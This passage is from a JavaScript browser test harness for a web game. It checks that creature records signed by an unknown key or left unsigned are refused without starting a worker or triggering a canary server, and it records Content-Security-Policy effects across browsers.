      },
    },
    {
      label: "record signed by another key",
      expectDrawn: false,
      make: () => signedRecord("sign-stranger", evil, satyr.pixels, other.privateKey),
    },
    {
      label: "record with no signature",
      expectDrawn: false,
      make: async () => {
        const record = await signedRecord("sign-unsigned", evil, satyr.pixels);
        return {
          id: record.id,
          build: { codeSha256: record.build.codeSha256, pixelsSha256: record.build.pixelsSha256 },
        };
      },
    },
  ];
  const rows = [];
  for (const entry of cases) {
    // a fresh context each time: if the direct worker were started, its script would be requested
    const { context, page } = await openGame(browser, name);
    canary.hits = 0;
    const record = await entry.make();
    const mark = traffic.length;
    const outcome = await page.evaluate(async (record) => {
      const drawn = await window.lampwarden.creaturePixels(record);
      return { drawn: drawn !== null };
    }, record);
    await sleep(300);
    const seen = traffic.slice(mark).map((request) => request.path.split("?")[0]);
    const row = {
      case: entry.label,
      drawn: outcome.drawn,
      workerScriptRequested: seen.includes("/creature-direct-worker.js"),
      codeFetched: seen.some((path) => path.endsWith("/code")),
      canaryHits: canary.hits,
    };
    rows.push(row);
    const passed =
      row.drawn === entry.expectDrawn && row.canaryHits === 0 && (entry.expectDrawn || !row.workerScriptRequested);
    if (!passed) fail(`${name}: signing case "${entry.label}": ${JSON.stringify(row)}`);
    console.log(
      `  ${entry.label.padEnd(54)} drawn ${row.drawn}, worker started ${row.workerScriptRequested}, code fetched ${row.codeFetched}, canary ${row.canaryHits}`,
    );
    await context.close();
  }
  results.signing[name] = rows;
}

// --- csp ---------------------------------------------------------------------------------------------------------------
async function cspEffects(name, browser) {
  const rows = [];
  for (const [label, draw, extraQuery] of [
    ["page without ?draw=direct", "quickjs", ""],
    ["page with ?draw=direct", "direct", ""],
  ]) {
    const { context, page, errors } = await openGame(browser, name, draw, extraQuery);
    const messages = [];
    page.on("console", (message) => {
      if (/content security policy|refused to/i.test(message.text())) messages.push(message.text().slice(0, 200));
    });
    await sleep(1500);
    const header = await page.evaluate(async () =>
      (await fetch(location.href, { method: "HEAD" })).headers.get("content-security-policy"),
    );
    const ticks = await page.evaluate(() => window.lampwarden.app() !== null);
    rows.push({
      page: label,
      policySent: header !== null,
      violations: await page.evaluate(() => window.__violations),
      consoleMessages: messages,
      pageErrors: errors,
      pixiRunning: ticks,
    });
    await context.close();
  }
  results.csp[name] = rows;
  for (const row of rows)
    console.log(
      `  csp, ${name}, ${row.page}: policy sent ${row.policySent}, violations ${row.violations.length}, page errors ${row.pageErrors.length}, pixi ${row.pixiRunning}`,
    );
}

const browsers = {};
for (const name of BROWSERS) browsers[name] = await launchers[name]();
for (const name of BROWSERS) {
  const browser = browsers[name];
  console.log(`\n=== ${name} (csp ${LABEL}) ===`);
  if (ONLY.includes("identity")) await identity(name, browser);
  if (ONLY.includes("signing")) await signing(name, browser);
  if (ONLY.includes("csp")) await cspEffects(name, browser);
  if (ONLY.includes("frames")) await frameTiming(name, browser);
  if (ONLY.includes("measure")) await measure(name, browser);
  if (ONLY.includes("probes")) await probes(name, browser);
}
for (const browser of Object.values(browsers)) await browser.close();
canaryServer.close();
proxy.close();
writeFileSync(join(OUT, `direct-${LABEL}.json`), `${JSON.stringify(results, null, 2)}\n`);
console.log(failures ? `\n${failures} failure(s)` : "\nall identity and signing checks passed");
process.exit(failures ? 1 : 0);
